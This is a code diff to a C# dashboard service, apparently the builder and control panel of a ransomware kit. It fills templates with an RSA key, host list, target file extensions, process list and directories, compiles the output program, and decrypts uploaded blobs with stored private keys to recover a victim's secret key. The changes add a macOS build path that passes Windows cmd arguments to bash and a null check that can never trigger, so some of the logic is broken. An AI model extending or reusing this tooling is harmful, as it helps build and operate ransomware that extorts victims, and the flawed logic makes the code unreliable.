@@ -15,6 +15,7 @@ using System.Diagnostics;
 using Microsoft.AspNetCore.Http;
 using System.Text;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 
 namespace BaphoDashBoard.DAL.Services
 {
@@ -252,10 +253,22 @@ namespace BaphoDashBoard.DAL.Services
                 var draw_processes = await DrawParameters(Path.Combine(output_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
                 var draw_dirs = await DrawParameters(output_path, "Program.cs", "<dirs list here>", model);
 
-                if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                 {
-                    var strCmdText = "/K cd " + output_path + " & compile.bat";
-                    Process.Start("CMD.exe", strCmdText).WaitForExit();
+                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                    {
+                        var strCmdText = "/K cd " + output_path + " & compile.bat";
+                        Process.Start("CMD.exe", strCmdText).WaitForExit();
+                    }
+                }
+
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+                {
+                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                    {
+                        var strCmdText = "/K cd " + output_path + " & compile.bat";
+                        Process.Start("bash", strCmdText).WaitForExit();
+                    }
                 }
             }
             catch(Exception ex)
@@ -427,18 +440,22 @@ namespace BaphoDashBoard.DAL.Services
                 var ms = new MemoryStream();
                 file.OpenReadStream().CopyTo(ms);
                 byte[] dataToDecrypt = ms.ToArray();
+                var get_secretkey = new AppResult<string>();
                 foreach(var privatekey in privatekey_list)
                 {
-                    var get_secretkey = RSADecrypt(dataToDecrypt, privatekey);
+                    get_secretkey = RSADecrypt(dataToDecrypt, privatekey);
                     if(get_secretkey.success != false)
                     {
                         result.MRObject = get_secretkey.MRObject;
+                        result.message = "key found!";
                         break;
                     }
-                    else
-                    {
+                }
 
-                    }
+                if(get_secretkey == null)
+                {
+                    result.success = false;
+                    result.message = "key not found";
                 }
             }
             catch (Exception ex)
